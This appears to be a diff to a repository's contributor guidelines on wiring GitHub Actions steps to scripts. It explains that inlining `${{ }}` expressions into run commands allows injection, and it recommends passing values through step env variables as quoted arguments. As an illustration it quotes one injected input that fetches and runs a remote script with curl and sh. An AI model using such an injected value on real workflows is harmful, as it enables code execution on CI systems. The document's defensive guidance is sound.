@@ -283,9 +283,28 @@ Two reasons this is a requirement, not a preference:
   extracting to a script sidesteps the whole class (#301, #302).
 
 Follow the `internals/move-major-tag` (`src/move_major_tag.py` + colocated unit test + `tests/`)
-and `check_e2e_verify_wired` precedents for structure. Passing a value from a step to a script is
-a CLI argument (`… check.py "${{ steps.detect.outputs.package_root }}"`), never an env
-side-channel — see **Never pass data through the environment**.
+and `check_e2e_verify_wired` precedents for structure.
+
+**A value a step hands a script arrives as a CLI argument, never read from the environment by the
+script itself.** Never inline `${{ }}` into the invocation: GitHub substitutes that text before bash
+parses it, so a `workflow_dispatch` input of `a"; curl evil.sh | sh; "` executes. Bind the
+expression to a step `env:` name, then pass that as a quoted shell variable in the argument list:
+
+```yaml
+env:
+  PACKAGES: ${{ inputs.packages }}
+run: pnpm run bootstrap-npm -- "$PACKAGES"
+```
+
+That `env:` name is bash's, not the script's. It exists only to carry the value across the templating
+layer, and bash expands it after parsing, as one argv element. The script reads `process.argv` /
+`sys.argv` and never `process.env` / `os.environ` for its own inputs — that read is the side-channel
+**Never pass data through the environment** forbids, and a step `env:` block is not an exemption
+from it.
+
+The exception is a variable some *other* tool reads from the environment as its own documented
+interface: `NODE_AUTH_TOKEN` for `npm publish`, `CI`, `PATH`. Those are that tool's contract, not our
+step-to-script wiring, and they stay in `env:`.
 
 ## Wiring gates are earned
 
